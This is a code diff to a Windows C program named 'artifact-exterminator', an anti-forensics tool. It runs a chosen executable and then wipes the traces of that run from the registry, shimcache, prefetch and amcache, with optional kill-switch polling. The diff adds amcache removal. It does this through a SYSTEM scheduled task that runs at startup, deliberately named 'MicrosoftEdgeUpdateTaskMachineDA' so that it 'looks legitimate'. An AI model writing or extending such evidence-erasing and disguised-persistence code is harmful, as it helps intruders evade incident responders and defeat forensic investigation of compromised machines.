@@ -15,6 +15,7 @@
 #include "prefetch.h"
 #include "utils.h"
 #include "killswitch.h"
+#include "amcache.h"
 
 
 /* 
@@ -30,17 +31,18 @@
  *    The root key can be specified by either its full name or by its shorthand
  *    i.e. HKEY_LOCAL_MACHINE HKLM
  * -v Registry values to remove, comma-separated. Value name should come after the key, separated by a colon.
-	  If any part of the argument contains a space, it should be wrapped in quotes.
+      If any part of the argument contains a space, it should be wrapped in quotes.
  *    e.g. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache
  * -a Additional file paths to clean up
- * -s Only run shimcache removal function. The value of this option is not relevant, but is still required.
+ * -s Running as scheduled task. The value of this option is not relevant, but is still required.
  *    e.g. artifact-exterminator.exe -f C:\Windows\System32\executable.exe -s 1
- *    The user should almost never have to use this argument. This is mainly used when scheduling a task to clear the shimcache.
+ *    The user should almost never have to use this argument. This is mainly used on features which require scheduled task to complete.
  * --features Specify features to run, comma-separated. If this argument is not provided, all features are ran by default.
  *            Possible values:
  *            registry
  *            shimcache
  *            prefetch
+ *            amcache
  */
 int wmain(int argc, wchar_t* argv[])
 {
@@ -54,7 +56,6 @@ int wmain(int argc, wchar_t* argv[])
     // Create folder to make registry backup
     CreateDirectoryW(registryBackupFolderPath, NULL);
 
-
     // Parse command line arguments
     wchar_t executableFilePath[MAX_PATH] = { 0 };
     wchar_t commandArgs[512] = { 0 };
@@ -64,11 +65,11 @@ int wmain(int argc, wchar_t* argv[])
     wchar_t killSwitchPollIntervalStr[10] = { 0 };
     wchar_t registryKeysToRemoveStr[1024] = { 0 };
     wchar_t registryValuesToRemoveStr[1024] = { 0 };
-    wchar_t runOnlyShimcacheRemoval[2] = { 0 };
+    wchar_t scheduledTaskRunning[2] = { 0 };
     wchar_t additionalExecutableNames[1024] = { 0 };
 
     getCommandLineValue(argc, argv, L"-a", additionalExecutableNames, 1024);
-    getCommandLineValue(argc, argv, L"-s", runOnlyShimcacheRemoval, 2);
+    getCommandLineValue(argc, argv, L"-s", scheduledTaskRunning, 2);
     getCommandLineValue(argc, argv, L"-f", executableFilePath, MAX_PATH);
     getCommandLineValue(argc, argv, L"--args", commandArgs, 512);
 
@@ -78,6 +79,7 @@ int wmain(int argc, wchar_t* argv[])
      * registry
      * shimcache
      * prefetch
+     * amcache
      */
     getCommandLineValue(argc, argv, L"--features", features, 120);
 
@@ -102,7 +104,7 @@ int wmain(int argc, wchar_t* argv[])
         features,
         registryKeysToRemoveStr,
         registryValuesToRemoveStr,
-        runOnlyShimcacheRemoval,
+        scheduledTaskRunning,
         additionalExecutableNames,
         killSwitchIP,
         killSwitchPort,
@@ -112,6 +114,7 @@ int wmain(int argc, wchar_t* argv[])
     BOOL registryFeatureEnabled = FALSE;
     BOOL shimcacheFeatureEnabled = FALSE;
     BOOL prefetchFeatureEnabled = FALSE;
+    BOOL amcacheFeatureEnabled = FALSE;
 
     // Enable specified features
     if (*features != NULL)
@@ -127,6 +130,8 @@ int wmain(int argc, wchar_t* argv[])
                 shimcacheFeatureEnabled = TRUE;
             else if (wcscmp(token, L"prefetch") == 0)
                 prefetchFeatureEnabled = TRUE;
+            else if (wcscmp(token, L"amcache") == 0)
+                amcacheFeatureEnabled = TRUE;
             else
                 wprintf(L"Unknown module \"%s\".\n", token);
             token = wcstok_s(NULL, L",", &nextToken);
@@ -139,6 +144,7 @@ int wmain(int argc, wchar_t* argv[])
         registryFeatureEnabled = TRUE;
         shimcacheFeatureEnabled = TRUE;
         prefetchFeatureEnabled = TRUE;
+        amcacheFeatureEnabled = TRUE;
     }
 
     // Convert registry deletion args (-k and -v) from comma-separated values to actual array
@@ -185,47 +191,79 @@ int wmain(int argc, wchar_t* argv[])
     }
 
     // Extract executable name from -f argument
-    wchar_t* executableFileName = wcsrchr(executableFilePath, L'\\');
-    if (executableFileName == NULL)
-        executableFileName = executableFilePath;
-    else
-        // Skip the delimiter
-        executableFileName = executableFileName + 1;
-
-    // Combine -f argument with -a argument, comma-separated
+    wchar_t* executableFileName;
     wchar_t executableNames[1024 + MAX_PATH];
-    if (*additionalExecutableNames != NULL)
+    executableNames[0] = '\0';
+
+    // If -f parameter exists, executableNames string will be a combination of -f and -a (if -a exists)
+    if (*executableFilePath == NULL && *additionalExecutableNames == NULL)
     {
-        swprintf_s(executableNames, L"%s,%s", additionalExecutableNames, executableFileName);
+        wprintf(L"[ERROR] Either -f or -a argument must be provided.\n");
+        return 1;
     }
+    else if (*executableFilePath != NULL)
+    {
+        executableFileName = wcsrchr(executableFilePath, L'\\');
+        if (executableFileName == NULL)
+            executableFileName = executableFilePath;
+        else
+            // Skip the delimiter
+            executableFileName = executableFileName + 1;
+
+        // Combine -f argument with -a argument, comma-separated
+        if (*additionalExecutableNames != NULL)
+            swprintf_s(executableNames, L"%s,%s", additionalExecutableNames, executableFileName);
+        else
+            wcsncpy_s(executableNames, executableFileName, wcslen(executableFileName));
+    }
+    // If -f parameter doesn't exist, fill executableNames with -a
     else
     {
-        wcsncpy_s(executableNames, executableFileName, wcslen(executableFileName));
+        wcsncpy_s(executableNames, 1024 + MAX_PATH, additionalExecutableNames, wcslen(additionalExecutableNames));
     }
+
     wprintf(L"[DEBUG] Executables to remove traces of: %s\n", executableNames);
+
+    // Convert the executableNames string to an array of items. Assume a max of 100 items
+    wchar_t* executableNamesArr[100] = { 0 };
+
+    {
+        wchar_t* nextToken;
+        wchar_t* token = wcstok_s(executableNames, L",", &nextToken);
+
+        for (int i = 0; token && i < 100; i++)
+        {
+            executableNamesArr[i] = token;
+            token = wcstok_s(NULL, L",", &nextToken);
+        }
+    }
     
     // FEAT: Schedule task to perform shimcache cleanup upon system reboot
     if(shimcacheFeatureEnabled)
-		scheduleShimcacheTask(executableNames);
+        scheduleShimcacheTask(executableNames);
+
+    // FEAT: Schedule task to perform amcache cleanup upon system reboot
+    if (amcacheFeatureEnabled)
+        scheduleAmcacheTask(executableNames);
 
     // FEAT: Backup registry
     if(registryFeatureEnabled)
-		backupRegistry(registryBackupFolderPath);
+        backupRegistry(registryBackupFolderPath);
 
     // FEAT: Run executable specified by -f argument
     if (*executableFilePath != NULL)
     {
-		STARTUPINFOW si;
-		ZeroMemory(&si, sizeof(si));
-		si.cb = sizeof(si);
-		PROCESS_INFORMATION pi;
-		ZeroMemory(&pi, sizeof(pi));
-		wchar_t command[512 + MAX_PATH];
-		wsprintf(command, L"/c %s %s", executableFilePath, commandArgs);
-		CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
-		WaitForSingleObject(pi.hProcess, INFINITE);
-		CloseHandle(pi.hThread);
-		CloseHandle(pi.hProcess);
+        STARTUPINFOW si;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&pi, sizeof(pi));
+        wchar_t command[512 + MAX_PATH];
+        wsprintf(command, L"/c %s %s", executableFilePath, commandArgs);
+        CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
 
         // After closing the executable, artifacts like prefetch files may take some time to be created.
         Sleep(2000);
@@ -234,51 +272,66 @@ int wmain(int argc, wchar_t* argv[])
     // FEAT: Poll for kill switch before performing any cleanup
     if (*killSwitchIP != NULL && *killSwitchPort != NULL)
     {
-		int killSwitchPollInterval = 10;
-		int port = _wtoi(killSwitchPort);
-		if (*killSwitchPollIntervalStr != NULL)
-			killSwitchPollInterval = _wtoi(killSwitchPollIntervalStr);
+        int killSwitchPollInterval = 10;
+        int port = _wtoi(killSwitchPort);
+        if (*killSwitchPollIntervalStr != NULL)
+            killSwitchPollInterval = _wtoi(killSwitchPollIntervalStr);
 
-		pollKillSwitch(killSwitchIP, port, killSwitchPollInterval);
+        pollKillSwitch(killSwitchIP, port, killSwitchPollInterval);
     }
 
     // FEAT: Restore registry to previous state
     if (registryFeatureEnabled)
     {
-		restoreRegistry(registryBackupFolderPath);
-		wprintf(L"Deleting registry values...\n");
-		deleteRegistryValues(numValues, registryValuesToRemove);
+        restoreRegistry(registryBackupFolderPath);
+        wprintf(L"Deleting registry values...\n");
+        deleteRegistryValues(numValues, registryValuesToRemove);
 
-		wprintf(L"Deleting registry keys...\n");
-		deleteRegistryKeys(numKeys, registryKeysToRemove);
+        wprintf(L"Deleting registry keys...\n");
+        deleteRegistryKeys(numKeys, registryKeysToRemove);
     }
 
     // Remove shimcache records of specified executable names
-    if (shimcacheFeatureEnabled && runOnlyShimcacheRemoval)
+    if (shimcacheFeatureEnabled && scheduledTaskRunning)
     {
-        // Split additionalExecutableNames by comma.
         // For each executable name, remove shimcache record.
-        wchar_t* nextToken;
-        wchar_t* token = wcstok_s(additionalExecutableNames, L",", &nextToken);
-        while (token)
+        for(int i = 0; i < 100; i++)
         {
-            removeShimcache(token);
-            token = wcstok_s(NULL, L",", &nextToken);
+            wchar_t* executableName = executableNamesArr[i];
+            if (executableName == NULL)
+            {
+                break;
+            }
+            removeShimcache(executableName);
         }
     }
 
     // FEAT: Clear prefetch records of specified executable names
     if(prefetchFeatureEnabled)
     {
-        wchar_t* nextToken;
-        wchar_t* token = wcstok_s(executableNames, L",", &nextToken);
-
-        while (token)
+        for(int i = 0; i < 100; i++)
         {
-            wprintf(L"[DEBUG] Removing prefetch file for %s\n", token);
-            if (!clearPrefetch(token))
-                wprintf(L"[DEBUG] Unable to find prefetch file for %s\n", token);
-            token = wcstok_s(NULL, L",", &nextToken);
+            wchar_t* executableName = executableNamesArr[i];
+            if (executableName == NULL)
+                break;
+
+            wprintf(L"[DEBUG] Removing prefetch file for %s\n", executableName);
+            if (!clearPrefetch(executableName))
+                wprintf(L"[DEBUG] Unable to find prefetch file for %s\n", executableName);
+        }
+    }
+
+    // Remove amcache records of specified executable names
+    if (amcacheFeatureEnabled && scheduledTaskRunning)
+    {
+        for(int i = 0; i < 100; i++)
+        {
+            wchar_t* executableName = executableNamesArr[i];
+            if (executableName == NULL)
+            {
+                break;
+            }
+            removeAmcache(executableName);
         }
     }
 
@@ -312,6 +365,35 @@ void scheduleShimcacheTask(wchar_t* executableNames)
         command,
         512,
         L"/c SCHTASKS /Create /F /RU SYSTEM /SC ONSTART /TN %s /TR \"%s -s 1 --features shimcache -a %s\"",
+        taskName,
+        filePath,
+        executableNames);
+    wprintf(L"[DEBUG] Task creation command:\n%s\n", command);
+
+    STARTUPINFOW si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, 10000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+
+void scheduleAmcacheTask(wchar_t* executableNames)
+{
+    wchar_t filePath[MAX_PATH];
+    GetModuleFileNameW(NULL, filePath, MAX_PATH);
+
+    // A task name that looks legitimate
+    const wchar_t* taskName = L"MicrosoftEdgeUpdateTaskMachineDA";
+
+    wchar_t command[512];
+    _snwprintf_s(
+        command,
+        512,
+        L"/c SCHTASKS /Create /F /RU SYSTEM /SC ONSTART /TN %s /TR \"%s -s 1 --features amcache -a %s\"",
         taskName,
         filePath,
         executableNames);
